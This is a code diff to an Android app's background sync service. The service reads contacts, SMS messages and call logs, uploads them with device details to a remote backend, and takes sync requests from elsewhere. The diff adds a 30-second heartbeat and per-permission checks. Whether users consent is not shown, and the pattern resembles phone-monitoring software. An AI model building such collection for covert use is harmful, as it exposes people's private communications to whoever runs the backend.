@@ -19,6 +19,7 @@ import android.provider.Telephony
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
+import androidx.core.content.PermissionChecker
 import androidx.preference.PreferenceManager
 import com.boxx.datasync.MainActivity
 import com.boxx.datasync.domain.repository.DataRepository
@@ -49,6 +50,7 @@ class SyncService : Service() {
     }
 
     private var remoteSyncJob: Job? = null
+    private var heartbeatJob: Job? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -80,6 +82,17 @@ class SyncService : Service() {
         }
 
         startRemoteSyncListener()
+        startHeartbeat()
+    }
+
+    private fun startHeartbeat() {
+        heartbeatJob?.cancel()
+        heartbeatJob = serviceScope.launch {
+            while (isActive) {
+                repository.updateHeartbeat(deviceId)
+                delay(30000) // 30 seconds
+            }
+        }
     }
 
     private fun startRemoteSyncListener() {
@@ -121,9 +134,17 @@ class SyncService : Service() {
             val lastCallSync = if (isFullSync) 0L else prefs.getLong("last_call_sync", 0L)
             val lastContactSync = if (isFullSync) 0L else prefs.getLong("last_contact_sync", 0L)
 
-            val contacts = if (hasRequiredPermissions()) DataHelper.fetchContacts(this@SyncService, sinceTimestamp = lastContactSync) else emptyList()
-            val smsList = if (hasRequiredPermissions()) DataHelper.fetchSMS(this@SyncService, sinceTimestamp = lastSmsSync) else emptyList()
-            val callLogs = if (hasRequiredPermissions()) DataHelper.fetchCallLogs(this@SyncService, sinceTimestamp = lastCallSync) else emptyList()
+            val contacts = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) {
+                DataHelper.fetchContacts(this@SyncService, sinceTimestamp = lastContactSync)
+            } else emptyList()
+
+            val smsList = if (hasPermission(android.Manifest.permission.READ_SMS)) {
+                DataHelper.fetchSMS(this@SyncService, sinceTimestamp = lastSmsSync)
+            } else emptyList()
+
+            val callLogs = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
+                DataHelper.fetchCallLogs(this@SyncService, sinceTimestamp = lastCallSync)
+            } else emptyList()
 
             repository.syncIncremental(deviceId, contacts, smsList, callLogs)
 
@@ -133,47 +154,43 @@ class SyncService : Service() {
                 if (contacts.isNotEmpty()) putLong("last_contact_sync", currentTime)
             }.apply()
 
-            repository.updateDeviceInfo(Device(
-                deviceName = "${Build.MANUFACTURER} ${Build.MODEL}",
-                manufacturer = Build.MANUFACTURER,
-                model = Build.MODEL,
-                osVersion = Build.VERSION.RELEASE,
-                deviceId = deviceId,
-                lastSyncTime = currentTime,
-                contactCount = DataHelper.fetchContacts(this@SyncService).size,
-                smsCount = DataHelper.fetchSMS(this@SyncService).size,
-                callLogCount = DataHelper.fetchCallLogs(this@SyncService).size,
-                notificationCount = 0, // Notifications are handled by ListenerService
-                timestamp = currentTime,
-                syncStatus = "Success",
-                syncRequestedAt = prefs.getLong("last_handled_sync_request", 0L)
+            val currentContactCount = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) DataHelper.fetchContacts(this@SyncService).size else 0
+            val currentSmsCount = if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this@SyncService).size else 0
+            val currentCallCount = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this@SyncService).size else 0
+
+            repository.updateDeviceInfoMap(deviceId, mapOf(
+                "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
+                "manufacturer" to Build.MANUFACTURER,
+                "model" to Build.MODEL,
+                "osVersion" to Build.VERSION.RELEASE,
+                "lastSyncTime" to currentTime,
+                "heartbeatAt" to currentTime,
+                "contactCount" to currentContactCount,
+                "smsCount" to currentSmsCount,
+                "callCount" to currentCallCount,
+                "timestamp" to currentTime,
+                "syncStatus" to "Synced",
+                "syncRequestedAt" to prefs.getLong("last_handled_sync_request", 0L)
             ))
             Log.d("SyncService", "Sync completed successfully (Full: $isFullSync)")
         } catch (e: Exception) {
             Log.e("SyncService", "Error during sync", e)
             crashlytics.recordException(e)
-            repository.updateDeviceInfo(Device(
-                deviceName = "${Build.MANUFACTURER} ${Build.MODEL}",
-                manufacturer = Build.MANUFACTURER,
-                model = Build.MODEL,
-                osVersion = Build.VERSION.RELEASE,
-                deviceId = deviceId,
-                lastSyncTime = currentTime,
-                syncStatus = "Error: ${e.localizedMessage ?: "Unknown error"}",
-                syncRequestedAt = prefs.getLong("last_handled_sync_request", 0L)
+            repository.updateDeviceInfoMap(deviceId, mapOf(
+                "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
+                "manufacturer" to Build.MANUFACTURER,
+                "model" to Build.MODEL,
+                "osVersion" to Build.VERSION.RELEASE,
+                "lastSyncTime" to currentTime,
+                "heartbeatAt" to currentTime,
+                "syncStatus" to "Error: ${e.localizedMessage ?: "Unknown error"}",
+                "syncRequestedAt" to prefs.getLong("last_handled_sync_request", 0L)
             ))
         }
     }
 
-    private fun hasRequiredPermissions(): Boolean {
-        val permissions = mutableListOf(
-            android.Manifest.permission.READ_CONTACTS,
-            android.Manifest.permission.READ_SMS,
-            android.Manifest.permission.READ_CALL_LOG
-        )
-        return permissions.all {
-            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
-        }
+    private fun hasPermission(permission: String): Boolean {
+        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
     }
 
     private fun createNotificationChannel() {
